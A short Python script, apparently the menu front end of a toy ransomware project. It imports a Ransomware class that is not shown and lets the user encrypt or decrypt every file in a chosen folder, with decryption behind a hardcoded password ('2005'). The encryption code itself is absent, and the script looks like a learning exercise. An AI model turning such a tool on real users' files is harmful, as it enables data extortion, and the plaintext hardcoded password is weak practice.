from ransomware import Ransomware
import getpass

white = "\033[97m"
green = "\033[92m"
red = "\033[91m"


def menu() -> int:
    print(f"\n{white}1. Encrypt files in folder")
    print(f"{white}2. Decrypt files in folder")
    print(f"{white}3. Exit")
    return int(input(f"{white}Enter choice: "))


def input_password(string: str) -> str:
    return getpass.getpass(string)


def validate_password(ransomware: Ransomware) -> bool:
    password = input_password(
        f"{white}Enter password to decrypt files (password is hidden): "
    )
    if password == ransomware.password:
        print(f"\n{green}Password is correct!\n")
        return True
    print(f"\n{red}Invalid password!")
    return False


if __name__ == "__main__":
    ransomware = Ransomware("2005")
    while True:
        choice = menu()

        if choice == 1:
            path = input(f"{white}Enter path: ")
            ransomware.encrypt_files_in_folder(path)
        elif choice == 2:
            if validate_password(ransomware):
                path = input(f"{white}Enter path: ")
                ransomware.decrypt_files_in_folder(path)
        elif choice == 3:
            break
        else:
            print(f"{red}\nInvalid choice!")
